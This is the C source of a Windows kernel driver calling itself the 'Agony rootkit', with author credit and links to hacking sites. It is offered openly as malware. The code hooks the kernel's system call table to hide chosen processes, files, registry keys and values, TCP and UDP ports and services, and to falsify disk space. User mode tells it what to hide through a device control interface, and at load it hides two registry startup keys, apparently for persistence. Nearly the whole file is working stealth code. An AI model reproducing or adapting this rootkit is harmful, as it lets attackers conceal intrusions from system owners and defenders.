/*

           Agony rootkit
           
               by Intox
               
               visit:   -spiritofhack.net
                        -undergroundkonnekt.net

*/


#include <ntddk.h>
#include "process.h"
#include "file.h"
#include "reg.h"
#include "port.h"
#include "disk.h"
#include "service.h"
#include "codemsg.h"


#define MAX_HIDDEN_OBJECT 128
// device definition
#define DEVICE L"\\Device\\agony"
#define DOSDEVICE L"\\DosDevices\\agony"

typedef unsigned char BOOL;

// SSDT type
typedef struct SERVICE_DESCRIPTOR_ENTRY
{
   unsigned int *ServiceTableBase;
   unsigned int *ServiceCounterTableBase;
   unsigned int NumberOfServices;
   unsigned char *ParamTableBase;
} SERVICE_DESCRIPTOR_ENTRY,*PSERVICE_DESCRIPTOR_ENTRY;

__declspec(dllimport) SERVICE_DESCRIPTOR_ENTRY KeServiceDescriptorTable;
PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;

// macros to install & uninstall hooks

#define SYSTEMSERVICE(_function)  \
      KeServiceDescriptorTable.ServiceTableBase[*(PULONG)((PUCHAR)_function+1)]

#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  \
       _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
       InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Orig)    


PDEVICE_OBJECT DriverDeviceObject = NULL; 
BOOL MDLinit = FALSE;

// hooked native APIs
extern ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformationAddress;
extern ZWQUERYDIRECTORYFILE ZwQueryDirectoryFileAddress;
extern ZWENUMERATEKEY ZwEnumerateKeyAddress;
extern ZWENUMERATEVALUEKEY ZwEnumerateValueKeyAddress;
extern ZWDEVICEIOCONTROLFILE ZwDeviceIoControlFileAddress;
extern ZWQUERYVOLUMEINFORMATIONFILE ZwQueryVolumeInformationFileAddress;

// Boolean, to know if hook are in place
BOOL ZwQuerySystemInformationHooked = FALSE;
BOOL ZwQueryDirectoryFileHooked = FALSE;
BOOL ZwEnumerateKeyHooked = FALSE;
BOOL ZwEnumerateValueKeyHooked = FALSE;
BOOL ZwDeviceIoControlFileHooked = FALSE;
BOOL ZwQueryVolumeInformationFileHooked = FALSE;

// pointer to tables of hooked objects
extern WCHAR *ProcessToHide[128];
extern WCHAR *FileToHide[128];
extern WCHAR *RegKeyToHide[128];
extern WCHAR *RegValueToHide[128];
extern USHORT TcpPortToHide[1024];
extern USHORT UdpPortToHide[1024];
extern WCHAR ServiceToHide[256];

// number of hooked objects
extern ULONG NbProcessToHide;
extern ULONG NbFileToHide;
extern ULONG NbRegKeyToHide;
extern ULONG NbRegValueToHide;
extern ULONG NbTcpPortToHide;
extern ULONG NbUdpPortToHide;

// space disk falsification
extern WCHAR HardDrives[26];
extern ULONG SpaceToHide[26];

NTSTATUS initMDL()
{  
   // map memory into our domain
   g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, 
                               KeServiceDescriptorTable.NumberOfServices*4);
   if(!g_pmdlSystemCall)
      return STATUS_UNSUCCESSFUL;

   MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

   // change MDL permissions
   g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
   MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);
   
   MDLinit = TRUE;

   return STATUS_SUCCESS;
}

void removeHooks()
{
   //DbgPrint("removeHooks()");   

   __asm cli  
      // replace original addresses
   if( ZwQuerySystemInformationHooked )
      UNHOOK_SYSCALL( ZwQuerySystemInformation, 
                      ZwQuerySystemInformationHook, 
                      ZwQuerySystemInformationAddress ); 
   if( ZwQueryDirectoryFileHooked )                                     
      UNHOOK_SYSCALL( ZwQueryDirectoryFile, 
                      ZwQueryDirectoryFileHook, 
                      ZwQueryDirectoryFileAddress );                 
   if( ZwEnumerateKeyHooked )
      UNHOOK_SYSCALL( ZwEnumerateKey, 
                      ZwEnumerateKeyHook, 
                      ZwEnumerateKeyAddress );
   if( ZwEnumerateValueKeyHooked )
      UNHOOK_SYSCALL( ZwEnumerateValueKey, 
                      ZwEnumerateValueKeyHook, 
                      ZwEnumerateValueKeyAddress ); 
   if( ZwDeviceIoControlFileHooked )
      UNHOOK_SYSCALL( ZwDeviceIoControlFile, 
                      ZwDeviceIoControlFileHook, 
                      ZwDeviceIoControlFileAddress ); 
   if( ZwQueryVolumeInformationFileHooked )
      UNHOOK_SYSCALL( ZwQueryVolumeInformationFile, 
                      ZwQueryVolumeInformationFileHook, 
                      ZwQueryVolumeInformationFileAddress );                               
   __asm sti                  
   
    
   
   // free the MDL
   if(g_pmdlSystemCall) {
      MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
      IoFreeMdl(g_pmdlSystemCall);
   }
   MDLinit = FALSE;
           
   return;
}

void Unload(IN PDRIVER_OBJECT DriverObject)
{
   UNICODE_STRING DosDeviceName;  
   ULONG i;
   
   //DbgPrint("Unloading driver...");
   
   removeHooks();

   // free memory
   for(i=0; i<NbProcessToHide; i++)
      ExFreePool( ProcessToHide[i] );
   for(i=0; i<NbFileToHide; i++)
      ExFreePool( FileToHide[i] );
   for(i=0; i<NbRegKeyToHide; i++)
      ExFreePool( RegKeyToHide[i] );
   for(i=0; i<NbRegValueToHide; i++)
      ExFreePool( RegValueToHide[i] );          
   
   // replace hidden services
   UnhideFromSCManager();
   
   // delete symbolic links
   RtlInitUnicodeString(&DosDeviceName, DOSDEVICE);
   IoDeleteSymbolicLink( &DosDeviceName );
   
   // delete device
   if( DriverDeviceObject != NULL )
      IoDeleteDevice( DriverDeviceObject );
}


// function to dispatch the IRPs
NTSTATUS IODispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
   Irp->IoStatus.Status = STATUS_SUCCESS;
   IoCompleteRequest(Irp,IO_NO_INCREMENT);
   return STATUS_SUCCESS;
}


void AddObjectToHide( WCHAR **Tab, PULONG Nb, WCHAR *Object, PNTSTATUS status )
{
   ULONG i;  
   SIZE_T size = (wcslen(Object)+1)*sizeof(WCHAR);  
   
   // verify that this object isn't already hidden
   for(i=0; i<*Nb; i++) {
      if( size == (wcslen(Tab[i])+1)*sizeof(WCHAR) && !memcmp(Object, Tab[i], size) )  
         return;         
   }         
   
   if( *Nb < MAX_HIDDEN_OBJECT ) {
      Tab[ *Nb ] = (WCHAR*)ExAllocatePool(PagedPool, size );
      
      if( !Tab[*Nb] ) 
         // MSDN says:
         // If ExAllocatePool returns NULL, the caller should return the NTSTATUS 
         // value STATUS_INSUFFICIENT_RESOURCES or should delay processing to 
         // another point in time.    
         *status = STATUS_INSUFFICIENT_RESOURCES;    
      else { 
         memcpy( Tab[*Nb], Object, size); 
         (*Nb)++;
      }   
   }       
}

// routine qui lancera les hooks
NTSTATUS IOManager(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{     
   PIO_STACK_LOCATION StackLocation = IoGetCurrentIrpStackLocation(Irp);
   ULONG IRPcode = StackLocation->Parameters.DeviceIoControl.IoControlCode;    
   WCHAR *buf;
   SIZE_T size;
   ULONG i;
   PUSHORT port;
   
   buf = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;
   
   Irp->IoStatus.Status = STATUS_SUCCESS; 
     
   switch( IRPcode ) {

      case CODEMSG(NO_MSG):
           //DbgPrint("buf: %ws", buf);
           break;     

      case CODEMSG(PROCESS_CODE):
           if( !ZwQuerySystemInformationHooked ) {
             if( !MDLinit ) {
                if( !NT_SUCCESS(initMDL()) ) {
                   Irp->IoStatus.Status = STATUS_UNSUCCESSFUL; 
                   break;
                }
             }     
             
             ZwQuerySystemInformationAddress =(ZWQUERYSYSTEMINFORMATION)
                    (SYSTEMSERVICE(ZwQuerySystemInformation));
                    
             __asm cli
             HOOK_SYSCALL( ZwQuerySystemInformation, 
                           ZwQuerySystemInformationHook, 
                           ZwQuerySystemInformationAddress );          
             __asm sti     
                
             ZwQuerySystemInformationHooked = TRUE;        
           }

           AddObjectToHide( ProcessToHide, &NbProcessToHide, buf, &(Irp->IoStatus.Status));
           break;     
           
      case CODEMSG(FILE_CODE):
          if( !ZwQueryDirectoryFileHooked ) {
             if( !MDLinit ) {
                if( !NT_SUCCESS(initMDL()) ) {
                   Irp->IoStatus.Status = STATUS_UNSUCCESSFUL; 
                   break;
                }
             }   
                
             ZwQueryDirectoryFileAddress = (ZWQUERYDIRECTORYFILE)
                   (SYSTEMSERVICE(ZwQueryDirectoryFile));
                    
             __asm cli
             HOOK_SYSCALL( ZwQueryDirectoryFile, 
                           ZwQueryDirectoryFileHook, 
                           ZwQueryDirectoryFileAddress );          
             __asm sti     
                
             ZwQueryDirectoryFileHooked = TRUE;       
           }
           AddObjectToHide( FileToHide, &NbFileToHide, buf, &(Irp->IoStatus.Status));
           break;       
      
      case CODEMSG(REGKEY_CODE):
           if( !ZwEnumerateKeyHooked ) {
             if( !MDLinit ) {
                if( !NT_SUCCESS(initMDL()) ) {
                   Irp->IoStatus.Status = STATUS_UNSUCCESSFUL; 
                   break;
                }
             }   
                
             ZwEnumerateKeyAddress = (ZWENUMERATEKEY)(SYSTEMSERVICE(ZwEnumerateKey));   
                    
             __asm cli
             HOOK_SYSCALL( ZwEnumerateKey, 
                           ZwEnumerateKeyHook, 
                           ZwEnumerateKeyAddress );          
             __asm sti     
                
             ZwEnumerateKeyHooked  = TRUE;      
           }
           AddObjectToHide( RegKeyToHide, &NbRegKeyToHide, buf, &(Irp->IoStatus.Status));
           break;  
      
      case CODEMSG(REGVALUE_CODE):
           if( !ZwEnumerateValueKeyHooked ) {
             if( !MDLinit ) {
                if( !NT_SUCCESS(initMDL()) ) {
                   Irp->IoStatus.Status = STATUS_UNSUCCESSFUL; 
                   break;
                }
             }   
                
             ZwEnumerateValueKeyAddress = (ZWENUMERATEVALUEKEY)
                   (SYSTEMSERVICE(ZwEnumerateValueKey)); 
                    
             __asm cli
             HOOK_SYSCALL( ZwEnumerateValueKey, 
                           ZwEnumerateValueKeyHook, 
                           ZwEnumerateValueKeyAddress );          
             __asm sti     
                
             ZwEnumerateValueKeyHooked = TRUE;      
           }
           AddObjectToHide( RegValueToHide, &NbRegValueToHide, buf, &(Irp->IoStatus.Status));
           break; 
      case CODEMSG(TCP_PORT_CODE):
           if( !ZwDeviceIoControlFileHooked ) {
             if( !MDLinit ) {
                if( !NT_SUCCESS(initMDL()) ) {
                   Irp->IoStatus.Status = STATUS_UNSUCCESSFUL; 
                   break;
                }
             }   

             ZwDeviceIoControlFileAddress = (ZWDEVICEIOCONTROLFILE)
                   (SYSTEMSERVICE(ZwDeviceIoControlFile));
                    
             __asm cli
             HOOK_SYSCALL( ZwDeviceIoControlFile, 
                           ZwDeviceIoControlFileHook, 
                           ZwDeviceIoControlFileAddress );         
             __asm sti     
                
             ZwDeviceIoControlFileHooked = TRUE;      
           }
           
           port = (PUSHORT)buf;
           
           for(i=0; i<NbTcpPortToHide; i++)
              if( *port == TcpPortToHide[i] )
                 // port already hidden
                 break;
           
           if( NbTcpPortToHide >= 1024 )
              // maximum number of hidden port, can not hide
              break;
           
           TcpPortToHide[ NbTcpPortToHide ] = *port;
           NbTcpPortToHide++;
           break;     
      case CODEMSG(UDP_PORT_CODE):
           if( !ZwDeviceIoControlFileHooked ) {
             if( !MDLinit ) {
                if( !NT_SUCCESS(initMDL()) ) {
                   Irp->IoStatus.Status = STATUS_UNSUCCESSFUL; 
                   break;
                }
             }   
       
             ZwDeviceIoControlFileAddress = (ZWDEVICEIOCONTROLFILE)
                   (SYSTEMSERVICE(ZwDeviceIoControlFile));
                    
             __asm cli
             HOOK_SYSCALL( ZwDeviceIoControlFile, 
                           ZwDeviceIoControlFileHook, 
                           ZwDeviceIoControlFileAddress );         
             __asm sti     
                
             ZwDeviceIoControlFileHooked = TRUE;      
           }
           port = (PUSHORT)buf;
           
           for(i=0; i<NbUdpPortToHide; i++)
              if( *port == UdpPortToHide[i] )
                 break;
           
           if( NbUdpPortToHide >= 1024 )
              break;
           
           UdpPortToHide[ NbUdpPortToHide ] = *port;
           NbUdpPortToHide++;
           break;
      
      case CODEMSG(SERVICE_CODE):
           Irp->IoStatus.Status = HideFromSCManager( buf );       
           break;
      case CODEMSG(DISK_SPACE_CODE):
           if( !ZwQueryVolumeInformationFileHooked ) {
             if( !MDLinit ) {
                if( !NT_SUCCESS(initMDL()) ) {
                   Irp->IoStatus.Status = STATUS_UNSUCCESSFUL; 
                   break;
                }
             }   
         
             ZwQueryVolumeInformationFileAddress = (ZWQUERYVOLUMEINFORMATIONFILE)
                   (SYSTEMSERVICE(ZwQueryVolumeInformationFile));
                    
             __asm cli
             HOOK_SYSCALL( ZwQueryVolumeInformationFile, 
                           ZwQueryVolumeInformationFileHook, 
                           ZwQueryVolumeInformationFileAddress );         
             __asm sti     
                
             ZwQueryVolumeInformationFileHooked = TRUE;  
           } 
           break;     
           
      default:
           Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;                            
   }
             
   // the .exe's DeviceIOControl blocks until we exec the IoCompleteRequest                        
   IoCompleteRequest(Irp,IO_NO_INCREMENT);
   return Irp->IoStatus.Status;
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    UNICODE_STRING DeviceName;
    UNICODE_STRING DosDeviceName;  
    NTSTATUS status;   
    
    //DbgPrint("Driver loaded.");
    DriverObject->DriverUnload = Unload;   
    
    // init strings
    RtlInitUnicodeString(&DeviceName, DEVICE);
    RtlInitUnicodeString(&DosDeviceName, DOSDEVICE);
    
    // to communicate with usermode, we need a device
    status = IoCreateDevice(
           DriverObject,        // ptr to caller object
           0,                   // extension device allocated byte number
           &DeviceName,         // device name 
           FILE_DEVICE_UNKNOWN, 
           0,                   // no special caracteristics
           FALSE,               // we can open many handles in same time
           &DriverDeviceObject); // [OUT] ptr to the created object
           
    if ( !NT_SUCCESS(status) ) 
       return STATUS_NO_SUCH_DEVICE;
    
    // we also need a symbolic link
    status = IoCreateSymbolicLink(&DosDeviceName,&DeviceName);
    if( !NT_SUCCESS(status) ) {
		IoDeleteDevice( DriverDeviceObject );
        //DbgPrint("Failed to create symbolic link");
        return STATUS_NO_SUCH_DEVICE;
    }   
    
    // handle IRPs :)
    DriverObject->MajorFunction[IRP_MJ_CREATE] = IODispatch;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]  = IODispatch;
    DriverObject->MajorFunction[IRP_MJ_READ]   = IODispatch;
    DriverObject->MajorFunction[IRP_MJ_WRITE]  = IODispatch;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOManager;    
    
    // hide our ActiveX startup values
    AddObjectToHide( RegKeyToHide, &NbRegKeyToHide, L"{232f4e3f2-bab8-11d0-97b9-00c04f98bcb9}", &status);
    AddObjectToHide( RegKeyToHide, &NbRegKeyToHide, L"{256dc5e0e-7c46-11d3-b5bf-0000f8695621}", &status);       
    
    return STATUS_SUCCESS;
}

